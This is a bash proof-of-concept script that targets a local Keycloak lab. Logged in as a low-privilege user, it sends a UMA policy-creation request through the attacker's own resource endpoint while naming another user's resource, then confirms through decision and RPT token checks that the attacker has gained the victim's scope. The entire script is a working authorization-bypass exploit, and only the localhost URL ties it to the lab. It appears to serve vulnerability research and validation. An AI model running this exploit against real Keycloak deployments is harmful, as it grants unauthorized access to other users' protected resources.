#!/usr/bin/env bash
set -euo pipefail

# End-to-end low-privilege PoC for the user-managed UMA policy authorization flaw.
# Run once against the seeded, clean lab. The runner intentionally fails if the
# victim resource is already authorized, so a prior run cannot mask the oracle.

BASE_URL='http://127.0.0.1:8080'
REALM='anypoc'
CLIENT_ID='resource-server-test'
CLIENT_SECRET='secret'
ATTACKER='marta'
PASSWORD='password'
SEED='/opt/keycloak-data/seed-info.json'
EVIDENCE_DIR='/home/playground/output/attempt_1/evidence'

mkdir -p "$EVIDENCE_DIR"

attacker_resource=$(jq -r '.attacker.resource_id' "$SEED")
victim_resource=$(jq -r '.victim.resource_id' "$SEED")
victim_name=$(jq -r '.victim.resource_name' "$SEED")
scope='Scope A'

token_response="$EVIDENCE_DIR/token.response.json"
curl -sS -X POST "$BASE_URL/realms/$REALM/protocol/openid-connect/token" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode grant_type=password \
  --data-urlencode client_id="$CLIENT_ID" \
  --data-urlencode client_secret="$CLIENT_SECRET" \
  --data-urlencode username="$ATTACKER" \
  --data-urlencode password="$PASSWORD" > "$token_response"
token=$(jq -er '.access_token' "$token_response")

request_decision() {
  local label="$1"
  local status
  status=$(curl -sS -D "$EVIDENCE_DIR/${label}.headers" \
    -o "$EVIDENCE_DIR/${label}.body" -w '%{http_code}' \
    -X POST "$BASE_URL/realms/$REALM/protocol/openid-connect/token" \
    -H 'Content-Type: application/x-www-form-urlencoded' \
    -H "Authorization: Bearer $token" \
    --data-urlencode grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
    --data-urlencode audience="$CLIENT_ID" \
    --data-urlencode permission="$victim_resource#$scope" \
    --data-urlencode response_mode=decision)
  printf '%s\n' "$status" > "$EVIDENCE_DIR/${label}.status"
  printf '%s' "$status"
}

before_status=$(request_decision before)
if [[ "$before_status" != '403' ]] || \
   [[ "$(jq -r '.error // empty' "$EVIDENCE_DIR/before.body")" != 'access_denied' ]]; then
  echo "FAIL: baseline was not denied (HTTP $before_status); refusing to claim an exploit" >&2
  exit 1
fi

cat > "$EVIDENCE_DIR/policy_request.json" <<EOF
{
  "name": "MartaCrossUserPolicy",
  "description": "local validation marker",
  "resources": ["$victim_resource"],
  "scopes": ["$scope"],
  "users": ["$ATTACKER"]
}
EOF
printf 'actor=%s\nroute_resource=%s\nvictim_resource=%s\nvictim_name=%s\n' \
  "$ATTACKER" "$attacker_resource" "$victim_resource" "$victim_name" \
  > "$EVIDENCE_DIR/context.txt"

create_status=$(curl -sS -D "$EVIDENCE_DIR/policy_create.headers" \
  -o "$EVIDENCE_DIR/policy_create.body" -w '%{http_code}' \
  -X POST "$BASE_URL/realms/$REALM/authz/protection/uma-policy/$attacker_resource" \
  -H 'Content-Type: application/json' \
  -H "Authorization: Bearer $token" \
  --data-binary "@$EVIDENCE_DIR/policy_request.json")
printf '%s\n' "$create_status" > "$EVIDENCE_DIR/policy_create.status"
policy_id=$(jq -er '.id' "$EVIDENCE_DIR/policy_create.body")
if [[ "$create_status" != '200' ]]; then
  echo "FAIL: policy endpoint returned HTTP $create_status" >&2
  exit 1
fi

after_status=$(request_decision after)
if [[ "$after_status" != '200' ]] || \
   [[ "$(jq -r '.result // false' "$EVIDENCE_DIR/after.body")" != 'true' ]]; then
  echo "FAIL: victim decision did not become allowed (HTTP $after_status)" >&2
  exit 1
fi

rpt_status=$(curl -sS -D "$EVIDENCE_DIR/rpt.headers" \
  -o "$EVIDENCE_DIR/rpt.body" -w '%{http_code}' \
  -X POST "$BASE_URL/realms/$REALM/protocol/openid-connect/token" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H "Authorization: Bearer $token" \
  --data-urlencode grant_type=urn:ietf:params:oauth:grant-type:uma-ticket \
  --data-urlencode audience="$CLIENT_ID" \
  --data-urlencode permission="$victim_resource#$scope")
printf '%s\n' "$rpt_status" > "$EVIDENCE_DIR/rpt.status"
if [[ "$rpt_status" != '200' ]]; then
  echo "FAIL: UMA token request returned HTTP $rpt_status" >&2
  exit 1
fi

rpt=$(jq -er '.access_token' "$EVIDENCE_DIR/rpt.body")
payload_b64=$(printf '%s' "$rpt" | cut -d. -f2 | tr '_-' '/+')
case $((${#payload_b64} % 4)) in
  2) payload_b64+='==' ;;
  3) payload_b64+='=' ;;
  0) ;;
  *) echo 'FAIL: malformed JWT payload' >&2; exit 1 ;;
esac
payload=$(printf '%s' "$payload_b64" | base64 -d 2>/dev/null)
printf '%s\n' "$payload" | jq . > "$EVIDENCE_DIR/rpt.claims.json"
if ! jq -e --arg rid "$victim_resource" --arg scope "$scope" \
  '.authorization.permissions[]? | select(.rsid == $rid and (.scopes | index($scope)))' \
  "$EVIDENCE_DIR/rpt.claims.json" > "$EVIDENCE_DIR/victim_permission.json"; then
  echo "FAIL: RPT did not contain the victim resource permission" >&2
  exit 1
fi

cat > "$EVIDENCE_DIR/summary.txt" <<EOF
PASS
policy_id=$policy_id
attacker=$ATTACKER
route_resource=$attacker_resource
victim_resource=$victim_resource
victim_scope=$scope
baseline=HTTP $before_status access_denied
policy_create=HTTP $create_status
after=HTTP $after_status result=true
rpt_permission=present
EOF
cat "$EVIDENCE_DIR/summary.txt"
